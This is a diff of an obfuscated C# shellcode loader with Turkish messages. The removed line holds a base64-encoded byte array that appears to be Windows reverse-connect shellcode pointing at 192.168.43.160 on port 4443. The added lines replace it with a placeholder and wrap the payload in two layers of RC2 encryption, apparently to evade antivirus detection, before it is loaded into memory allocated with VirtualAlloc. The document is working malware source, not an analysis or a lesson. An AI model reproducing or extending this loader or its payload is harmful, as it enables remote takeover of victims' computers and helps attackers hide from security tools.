@@ -63,21 +63,21 @@ namespace JnSSwffRdKpR
 
         static void Main()
         {
-            //paste source code
-            string base64Encoded = "MHhmYywweGU4LDB4OGYsMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGQyLDB4NjQsMHg4YiwweDUyLDB4MzAsMHg4YiwweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHg4YiwweDcyLDB4MjgsMHgzMSwweGMwLDB4YWMsMHgzYywweDYxLDB4N2MsMHgwMiwweDJjLDB4MjAsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4NDksMHg3NSwweGVmLDB4NTIsMHg4YiwweDUyLDB4MTAsMHg4YiwweDQyLDB4M2MsMHgwMSwweGQwLDB4OGIsMHg0MCwweDc4LDB4ODUsMHhjMCwweDU3LDB4NzQsMHg0YywweDAxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDhiLDB4NTgsMHgyMCwweDAxLDB4ZDMsMHg4NSwweGM5LDB4NzQsMHgzYywweDMxLDB4ZmYsMHg0OSwweDhiLDB4MzQsMHg4YiwweDAxLDB4ZDYsMHgzMSwweGMwLDB4YzEsMHhjZiwweDBkLDB4YWMsMHgwMSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjQsMHgwMywweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGUwLDB4NTgsMHg4YiwweDU4LDB4MjQsMHgwMSwweGQzLDB4NjYsMHg4YiwweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDU4LDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlOSwweDgwLDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg2OCwweDMzLDB4MzIsMHgwMCwweDAwLDB4NjgsMHg3NywweDczLDB4MzIsMHg1ZiwweDU0LDB4NjgsMHg0YywweDc3LDB4MjYsMHgwNywweGZmLDB4ZDUsMHhiOCwweDkwLDB4MDEsMHgwMCwweDAwLDB4MjksMHhjNCwweDU0LDB4NTAsMHg2OCwweDI5LDB4ODAsMHg2YiwweDAwLDB4ZmYsMHhkNSwweDUwLDB4NTAsMHg1MCwweDUwLDB4NDAsMHg1MCwweDQwLDB4NTAsMHg2OCwweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDk3LDB4ZTgsMHgwZiwweDAwLDB4MDAsMHgwMCwweDMxLDB4MzksMHgzMiwweDJlLDB4MzEsMHgzNiwweDM4LDB4MmUsMHgzNCwweDMzLDB4MmUsMHgzMSwweDM2LDB4MzAsMHgwMCwweDY4LDB4YTksMHgyOCwweDM0LDB4ODAsMHhmZiwweGQ1LDB4OGIsMHg0MCwweDFjLDB4NmEsMHgwYSwweDUwLDB4NjgsMHgwMiwweDAwLDB4MTEsMHg1YiwweDg5LDB4ZTYsMHg2YSwweDEwLDB4NTYsMHg1NywweDY4LDB4OTksMHhhNSwweDc0LDB4NjEsMHhmZiwweGQ1LDB4ODUsMHhjMCwweDc0LDB4MGEsMHhmZiwweDRlLDB4MDgsMHg3NSwweGVjLDB4ZTgsMHhkYywweDAwLDB4MDAsMHgwMCwweDZhLDB4MDAsMHg2YSwweDA0LDB4NTYsMHg1NywweDY4LDB4MDIsMHhkOSwweGM4LDB4NWYsMHhmZiwweGQ1LDB4ODMsMHhmOCwweDAwLDB4N2UsMHg0OSwweDhiLDB4MzYsMHg4MSwweGY2LDB4MTksMHhlYywweDRkLDB4YWQsMHg4ZCwweDhlLDB4MDAsMHgwMSwweDAwLDB4MDAsMHg2YSwweDQwLDB4NjgsMHgwMCwweDEwLDB4MDAsMHgwMCwweDUxLDB4NmEsMHgwMCwweDY4LDB4NTgsMHhhNCwweDUzLDB4ZTUsMHhmZiwweGQ1LDB4OGQsMHg5OCwweDAwLDB4MDEsMHgwMCwweDAwLDB4NTMsMHg1NiwweDUwLDB4NmEsMHgwMCwweDU2LDB4NTMsMHg1NywweDY4LDB4MDIsMHhkOSwweGM4LDB4NWYsMHhmZiwweGQ1LDB4ODMsMHhmOCwweDAwLDB4N2QsMHgyOCwweDU4LDB4NjgsMHgwMCwweDQwLDB4MDAsMHgwMCwweDZhLDB4MDAsMHg1MCwweDY4LDB4MGIsMHgyZiwweDBmLDB4MzAsMHhmZiwweGQ1LDB4NTcsMHg2OCwweDc1LDB4NmUsMHg0ZCwweDYxLDB4ZmYsMHhkNSwweDVlLDB4NWUsMHhmZiwweDBjLDB4MjQsMHgwZiwweDg1LDB4NTEsMHhmZiwweGZmLDB4ZmYsMHhlOSwweDg4LDB4ZmYsMHhmZiwweGZmLDB4MDEsMHhjMywweDI5LDB4YzYsMHg3NSwweGMxLDB4NWIsMHg1OSwweDVkLDB4NTUsMHg1NywweDg5LDB4ZGYsMHhlOCwweDEwLDB4MDAsMHgwMCwweDAwLDB4MmUsMHg2YywweGY5LDB4ODAsMHgwNywweDk4LDB4OTYsMHgwYywweGJjLDB4NjQsMHgwMSwweGIxLDB4ZTksMHg2MiwweGUzLDB4OWQsMHg1ZSwweDMxLDB4YzAsMHhhYSwweGZlLDB4YzAsMHg3NSwweGZiLDB4ODEsMHhlZiwweDAwLDB4MDEsMHgwMCwweDAwLDB4MzEsMHhkYiwweDAyLDB4MWMsMHgwNywweDg5LDB4YzIsMHg4MCwweGUyLDB4MGYsMHgwMiwweDFjLDB4MTYsMHg4YSwweDE0LDB4MDcsMHg4NiwweDE0LDB4MWYsMHg4OCwweDE0LDB4MDcsMHhmZSwweGMwLDB4NzUsMHhlOCwweDMxLDB4ZGIsMHhmZSwweGMwLDB4MDIsMHgxYywweDA3LDB4OGEsMHgxNCwweDA3LDB4ODYsMHgxNCwweDFmLDB4ODgsMHgxNCwweDA3LDB4MDIsMHgxNCwweDFmLDB4OGEsMHgxNCwweDE3LDB4MzAsMHg1NSwweDAwLDB4NDUsMHg0OSwweDc1LDB4ZTUsMHg1ZiwweGMzLDB4YmIsMHhmMCwweGI1LDB4YTIsMHg1NiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDU="; // Your base64 encoded string here
+            string base64Encoded = "a="; // Your base64 encoded string here
             string decodedString = Encoding.ASCII.GetString(Convert.FromBase64String(base64Encoded));
 
             // Encrypting with RC2
-            string encrypted = RC2_Sifrele(decodedString, "12345678"); // Replace with your actual key
+            string encrypted = RC2_Sifrele(decodedString, "12332489"); // Replace with your actual key
 
-            MessageBox.Show("Yükleme işlemi başlatıldı");
+            // Encrypting the already encrypted data with another RC2 key
+            string doubleEncrypted = RC2_Sifrele(encrypted, "12345654"); // Replace with your actual second key
 
-            // Decrypting with RC2 (if needed)
-            string decrypted = RC2_Coz(encrypted, "12345678"); // Replace with your actual key
-         
+            // Decrypting the double encrypted data
+            string decryptedOnce = RC2_Coz(doubleEncrypted, "12345654"); // Use the second key
+            string fullyDecrypted = RC2_Coz(decryptedOnce, "12332489"); // Use the first key
 
             // Memory manipulation code
-            string[] chars = decrypted.Split(',').ToArray();
+            string[] chars = fullyDecrypted.Split(',').ToArray();
             byte[] TRjIDiwyWS = new byte[chars.Length];
             for (int i = 0; i < chars.Length; ++i) { TRjIDiwyWS[i] = Convert.ToByte(chars[i], 16); }
             IntPtr TCdulTDFAX = VirtualAlloc(0, (UInt32)TRjIDiwyWS.Length, 0x3000, 0x04);
@@ -90,7 +90,7 @@ namespace JnSSwffRdKpR
 
             // Wait for user input before closing
             Console.WriteLine("Programı kapatmak için bir tuşa basın...");
-           
+            Console.ReadKey();
         }
     }
 }
